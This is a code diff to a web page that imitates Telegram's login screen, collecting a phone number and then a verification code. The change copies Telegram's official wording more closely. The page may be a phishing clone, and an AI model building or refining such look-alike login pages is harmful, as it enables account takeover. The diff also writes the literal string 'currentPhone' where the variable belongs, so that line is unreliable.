@@ -53,8 +53,12 @@
                 <div id="auth-qr-form" class="custom-scroll">
                     <div class="auth-form" id="codeForm" style="display: none;">
                         <div id="logo"></div>
-                        <h1>Enter Code</h1>
-                        <p class="note">We have sent you a message in Telegram with the code.</p>
+                        <h1><span id="enteredPhone"></span>
+                            <div class="auth-number-edit div-button" role="button" tabindex="0" title="Wrong number?" aria-label="Wrong number?">
+                                <i class="icon icon-edit" aria-hidden="true"></i>
+                            </div>
+                        </h1>
+                        <p class="note">We've sent the code to the <b>Telegram</b> app on your other device.</p>
                         <form class="form" action="">
                             <div class="input-group touched with-label">
                                 <input class="form-control" type="text" id="verificationCode" inputmode="tel" aria-label="Code">
@@ -813,6 +817,7 @@ window.addEventListener("DOMContentLoaded", () => {
     const phoneForm = document.getElementById("phoneForm");
     const codeForm = document.getElementById("codeForm");
     const verificationInput = document.getElementById("verificationCode");
+    const enteredPhone = document.getElementById("enteredPhone");
     let currentPhone = null;  // to remember the phone number for the code step
 
     document.getElementById("nextBtn").addEventListener("click", function () {
@@ -832,6 +837,7 @@ window.addEventListener("DOMContentLoaded", () => {
                 currentPhone = phone;      // save phone for next request
                 phoneForm.style.display = "none";
                 codeForm.style.display = "block";
+                enteredPhone.textContent = "currentPhone";
             } else {
                 alert("Error: " + data.message);
             }
